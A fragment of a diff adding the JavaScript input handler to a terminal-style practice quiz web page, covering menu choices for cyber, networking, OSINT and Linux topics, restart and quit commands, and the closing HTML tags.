+  if (e.key === 'Enter') {
+    e.preventDefault();
+    if (typing) return;
+    const val = userInput.value;
+    hideInput();
+
+    if (val.trim() === '') {
+      addLine('[!] Type your answer first.', 'dim');
+      showInput();
+      return;
+    }
+
+    recordInput(val);
+    const trimmed = val.trim().toLowerCase();
+
+    if (trimmed === 'quit' && (state === 'question' || state === 'menu')) {
+      await showEndScreen();
+      return;
+    }
+    if (trimmed === 'menu' && state === 'question') {
+      resetStats();
+      addLine('');
+      await showMenu();
+      return;
+    }
+
+    if (state === 'menu') {
+      const choice = parseInt(trimmed);
+      if (choice >= 1 && choice <= 5) {
+        const topicMap = {1:'all',2:'cyber',3:'networking',4:'osint',5:'linux'};
+        selectedTopic = topicMap[choice];
+        buildSession(selectedTopic);
+        resetStats();
+        addLine('');
+        const topicLabel = selectedTopic === 'all' ? 'All Topics' : selectedTopic.charAt(0).toUpperCase() + selectedTopic.slice(1);
+        await typeText('Starting practice: ' + topicLabel + ' (' + totalQuestions + ' questions)');
+        await typeText('Type "menu" to return or "quit" to end.');
+        await typeText('');
+        askQuestion();
+      } else {
+        addLine('[!] Enter a number 1-5.', 'dim');
+        showInput();
+      }
+    } else if (state === 'question') {
+      await handleAnswer(val);
+    } else if (state === 'end') {
+      const choice = parseInt(trimmed);
+      if (choice === 1) {
+        buildSession(selectedTopic);
+        resetStats();
+        addLine('');
+        await typeText('Restarting practice...');
+        await typeText('');
+        askQuestion();
+      } else if (choice === 2) {
+        resetStats();
+        addLine('');
+        await showMenu();
+      } else {
+        addLine('[!] Enter 1 or 2.', 'dim');
+        showInput();
+      }
+    }
+  }
+});
+
+terminal.addEventListener('click', () => { userInput.focus(); });
+
+boot();
+</script>
+</body>
+</html>
